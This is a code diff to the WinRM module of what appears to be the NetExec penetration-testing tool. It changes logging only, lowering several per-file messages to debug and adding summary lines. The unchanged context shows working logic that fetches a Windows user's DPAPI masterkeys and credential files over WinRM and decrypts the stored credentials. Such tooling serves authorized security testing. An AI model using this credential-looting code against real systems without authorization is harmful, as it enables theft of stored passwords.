@@ -20,6 +20,7 @@ from impacket.uuid import bin_to_string
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.logger import highlight
 from nxc.helpers.misc import gen_random_string
 from nxc.helpers.ntlm_parser import parse_challenge
 from nxc.logger import NXCAdapter
@@ -370,6 +371,8 @@ class winrm(connection):
             ntpath.join("C:\\Users", self.username, "AppData\\Local\\Microsoft\\Credentials")
         ]
 
+        self.logger.display("Collecting DPAPI masterkeys...")
+
         sids = self.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
         if not sids:
             self.logger.fail(f"No masterkeys found for user {self.username}")
@@ -383,7 +386,7 @@ class winrm(connection):
                 stripped_key = key.strip()
                 if is_guid(stripped_key):
                     key_path = ntpath.join(keys_path, stripped_key)
-                    self.logger.display(f"Found masterkey file {key_path}")
+                    self.logger.debug(f"Found masterkey file {key_path}")
                     local_key_file = f"{TMP_PATH}/{stripped_key}"
                     self.conn.fetch(key_path, local_key_file)
                     decrypted_key = self.get_master_key(local_key_file, sid, self.password)
@@ -394,6 +397,8 @@ class winrm(connection):
             self.logger.fail("Could not decrypt any keys")
             return
 
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
+
         credential_files = []
         for user_credentials_path in user_credentials_paths:
             creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
@@ -401,7 +406,7 @@ class winrm(connection):
                 stripped_cred_file = cred_file.strip()
                 if is_credfile(stripped_cred_file):
                     creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
-                    self.logger.display(f"Found credentials file {creds_path}")
+                    self.logger.debug(f"Found credentials file {creds_path}")
                     local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"
                     self.conn.fetch(creds_path, local_cred_file)
                     credential_files.append(local_cred_file)
@@ -423,7 +428,7 @@ class winrm(connection):
                 try:
                     decrypted = blob.decrypt(right_key)
                     if decrypted is not None:
-                        self.logger.success(f"Successfully decrypted credentials in {creds_file}:")
+                        self.logger.debug(f"Successfully decrypted credentials in {creds_file}:")
                         creds = CREDENTIAL_BLOB(decrypted)
                         target = creds["Target"].decode("utf-16le")
                         username = creds["Username"].decode("utf-16le")
@@ -469,30 +474,30 @@ class winrm(connection):
         # if mkf['flags'] & 4 ? SHA1 : MD4
         decryptedKey = mk.decrypt(key3)
         if decryptedKey:
-            self.logger.success("Decrypted key with User Key (MD4 protected)")
+            self.logger.debug("Decrypted key with User Key (MD4 protected)")
             return decryptedKey
 
         decryptedKey = mk.decrypt(key2)
         if decryptedKey:
-            self.logger.success("Decrypted key with User Key (MD4)")
+            self.logger.debug("Decrypted key with User Key (MD4)")
             return decryptedKey
 
         decryptedKey = mk.decrypt(key1)
         if decryptedKey:
-            self.logger.success("Decrypted key with User Key (SHA1)")
+            self.logger.debug("Decrypted key with User Key (SHA1)")
             return decryptedKey
 
         decryptedKey = bkmk.decrypt(key3)
         if decryptedKey:
-            self.logger.success("Decrypted Backup key with User Key (MD4 protected)")
+            self.logger.debug("Decrypted Backup key with User Key (MD4 protected)")
             return decryptedKey
 
         decryptedKey = bkmk.decrypt(key2)
         if decryptedKey:
-            self.logger.success("Decrypted Backup key with User Key (MD4)")
+            self.logger.debug("Decrypted Backup key with User Key (MD4)")
             return decryptedKey
 
         decryptedKey = bkmk.decrypt(key1)
         if decryptedKey:
-            self.logger.success("Decrypted Backup key with User Key (SHA1)")
+            self.logger.debug("Decrypted Backup key with User Key (SHA1)")
             return decryptedKey
